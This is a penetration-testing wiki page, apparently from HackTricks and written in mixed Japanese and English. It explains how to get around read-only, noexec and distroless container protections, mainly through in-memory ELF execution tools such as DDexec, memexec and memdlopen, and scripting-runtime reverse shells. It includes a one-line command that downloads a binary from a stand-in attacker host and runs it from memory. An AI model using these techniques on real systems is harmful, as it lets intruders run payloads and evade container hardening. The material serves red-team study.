# FS protections を bypass: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

以下の動画では、このページで説明する techniques をより詳しく解説しています。<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - ステルスと回避のための Linux メモリ操作の探求**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**DDexec-ng と in-memory dlopen() によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

container では、security context に **`readOnlyRootFilesystem: true`** を設定することで、root filesystem を read-only として mount できます。<sup>[[3]](#references)</sup> 例:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

read-only の root は、別途 mount された volume を read-only にはしません。Docker は **`/dev/shm`** を IPC mount として扱います。一方、`rw` や `noexec` などの tmpfs options は runtime configuration の選択であるため、いずれかの動作を前提にする前に、対象 container の mount options を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> red-team の観点では、この組み合わせにより、まだ利用可能になっていない binary（例えば backdoor や enumeration tools）を download して execute することが難しくなる可能性があります。<sup>[[4]](#references)[[5]](#references)</sup>

## Easiest bypass: Scripts

`noexec` mount は、その mount 上にある binary の直接実行を block しますが、interpreter は引き続き script を読み取り、interpret できます。したがって、`sh` または `python` が存在する場合、その interpreter を介して shell script や Python script を実行できます。<sup>[[5]](#references)</sup>

必要な tool 自体が binary である場合、これは役に立ちません。<sup>[[5]](#references)</sup>

## Memory Bypasses

mount された path からの直接実行が block されている場合、ELF を memory に load し、in-memory path を介して execute する方法があります。これにより、その mount に対する `noexec` check は回避できますが、その他の kernel、permission、policy による controls がなくなるわけではありません。<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

scripting runtime が該当する Linux interface に access できる場合、**`memfd_create(2)`** によって anonymous で RAM-backed な file descriptor を作成し、そこへ ELF bytes を書き込み、fd-backed execution path を使用できます。[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project は、この workflow 用に圧縮および base64-encoded された Python、Perl、または Ruby code を生成します。<sup>[[6]](#references)[[7]](#references)</sup>

この project が現在 document している target は Python、Perl、Ruby です。PHP や Node には別の runtime-specific technique または extension が必要です。そのため、ある language 用のこの generator が存在しないことは、in-memory execution が不可能であることを意味しません。<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> **`/dev/shm`** に書き込まれた通常の executable は、その mount の **`noexec`** setting の対象であり続けます。通常の file descriptor を介して開くだけでは、mount policy は変わりません。<sup>[[5]](#references)</sup>
>
> 正確な memory-execution method は、runtime、architecture、kernel、利用可能な permissions にも依存します。<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、**`/proc/self/mem`** を介して、実行中の shell process に stager と loader を書き込み、その code に control を移します。<sup>[[8]](#references)</sup>

これにより、その binary を executable filesystem 上に事前に配置することなく、指定した binary を process に load できます。<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** は、**memory** から shellcode または binary を load して **execute** できます。<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) は daemonized DDexec implementation です。その daemon は arguments と raw program bytes を含む requests を待ち受け、各 program を load して実行するために child を fork し、parent は server として維持します。<sup>[[9]](#references)</sup>

この repository には、[a.php](https://github.com/arget13/memexec/blob/main/a.php) に **PHP reverse shell から memexec を使用して binaries を実行する**例が含まれています。<sup>[[9]](#references)</sup>

### Memdlopen

DDexec と同様の目的を持つ [**memdlopen**](https://github.com/arget13/memdlopen) は、shared object または program 向けの fileless `dlopen()` implementation です。現在の README では ARM64 の support が document されているため、使用前に target architecture を確認してください。<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless が実際には何なのか**、いつ役立つのか、いつ役立たないのか、また container 内で post-exploitation tradecraft がどのように変わるのかについて詳しくは、以下を確認してください。

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless images には application とその runtime dependencies のみが含まれます。official images では、package managers、shells、および standard Linux distribution に通常含まれるその他の programs が省略されています。<sup>[[11]](#references)</sup>

runtime image をこれらの dependencies に限定することで、production に存在する software と、scan および tracking が必要な量を削減できます。<sup>[[11]](#references)</sup>

### Reverse Shell

distroless container では、通常の shell 用の **`sh` や `bash` が見つからない**場合があり、`ls`、`whoami`、`id` などの common utilities も存在しないことがあります。<sup>[[11]](#references)</sup>

> [!WARNING]
> そのため、通常の shell-based reverse shell や utility-based enumeration は機能しない可能性があります。<sup>[[11]](#references)</sup>

compromised application に language runtime（例えば Flask application 用の Python や Node application 用の Node.js）が含まれている場合、RCE はその runtime を command channel として使用し、API を通じて system inspection を行える可能性があります。<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 利用可能な scripting language を使用し、その language capabilities を通じて **system を enumerate** してください。<sup>[[12]](#references)</sup>

**read-only/no-exec** protections が存在しない場合、command channel は writable かつ executable な mount に binaries を書き込み、それらを実行できる可能性があります。まず mount options と permissions を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> これらの protections が存在する場合は、runtime、kernel、permissions が許可する範囲で、上記の **memory-execution techniques** を使用してください。<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE vulnerabilities を exploit して scripting-language **reverse shells** を取得し、memory から binaries を実行する **examples** は、[**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) にあります。<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - ステルスと回避のための Linux メモリ操作の探究](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng と in-memory dlopen() によるステルス侵入 - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod または Container の Security Context を設定する](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
